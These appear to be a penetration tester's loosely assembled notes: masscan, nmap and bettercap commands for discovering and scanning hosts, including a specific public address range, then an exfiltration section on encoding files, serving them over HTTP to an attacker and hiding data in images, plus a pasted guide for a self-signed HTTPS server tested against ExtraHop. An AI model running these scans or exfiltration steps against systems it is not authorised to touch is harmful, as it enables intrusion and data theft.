## Discovering hosts from the outside


```
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```

TCP

```
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```


UDP

```
nmap -sU -sV --version-intensity 0 -F -n <IP>/24
```


Passive Discovery

```
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```


## Scanning Host

TCP

```
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP> 

# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP> 

# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```

UDP

```
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP> 

# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>

# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP> 

# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>

# You could use nmap to test all the UDP ports, but that will take a lot of time
```



## Exfiltration

Linux

```
base64 -w0 <file> #Encode file
base64 -d file #Decode file**
```

Windows

```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```


HTTP connection from internal host to attacker

Python simple server

```
python3 -m http.server
```

Vic

```
wget .... <snipped>
```

1) hide message in images
2) Send to attacker / download image contained within the image


Generate a Self-Signed Certificate

    Generate a Private Key:

    bash

openssl genrsa -out server.key 2048

Generate a Certificate Signing Request (CSR):

bash

openssl req -new -key server.key -out server.csr

    Fill in the details as prompted. For the "Common Name," use your server's IP address or domain name.

Generate the Self-Signed Certificate:

bash

    openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt

Step 2: Create a Simple HTTPS Server in Python

    Create a Directory for Your Server Files:

    bash

mkdir https_server
cd https_server

Create a Simple Python HTTP Server Script:

    Create a file named https_server.py and add the following code:

python

import http.server
import ssl

# Define the server and the handler
server_address = ('', 4443)
httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)

# Wrap the server's socket with SSL
httpd.socket = ssl.wrap_socket(httpd.socket,
                               keyfile="server.key",
                               certfile="server.crt",
                               server_side=True)

print("Serving on port 4443")
httpd.serve_forever()

Move the Certificate and Key to the Server Directory:

bash

    mv ../server.key .
    mv ../server.crt .

Step 3: Run the HTTPS Server

    Run the Python Script:

    bash

    python3 https_server.py

        The server will start and listen on port 4443.

Step 4: Generate Traffic and Test

    Generate HTTPS Traffic:
        Open a web browser and navigate to https://<your-server-ip>:4443.
        You will receive a security warning because the certificate is self-signed. Proceed anyway.

    Verify with ExtraHop:
        Check ExtraHop to see if it detects the self-signed certificate and provides any alerts or insights about it.

nstalling Dependencies

If you donâ€™t have http.server or ssl modules (they are part of Python standard library, so they should be available), you may need to install Python:

    For Ubuntu/Debian:

    bash

sudo apt-get update
sudo apt-get install python3
